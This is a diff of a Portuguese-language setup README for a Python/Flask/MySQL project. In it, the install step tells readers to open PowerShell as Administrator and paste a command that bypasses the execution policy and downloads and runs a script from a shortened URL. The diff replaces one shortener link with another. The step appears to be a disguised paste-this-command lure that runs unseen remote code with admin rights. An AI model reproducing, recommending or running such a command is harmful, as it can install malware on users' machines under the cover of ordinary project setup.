@@ -9,7 +9,7 @@ Stack: Python + Flask + MySQL · Cenário: AliSafe / SisTrac
 Abrir o **PowerShell como Administrador** e colar:
 
 ```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force; irm https://is.gd/WQebAy | iex
+Set-ExecutionPolicy Bypass -Scope Process -Force; irm https://clck.ru/3UJ8GT | iex
 ```
 
 > Baixa e executa o script automaticamente. Reinicie o computador ao final.
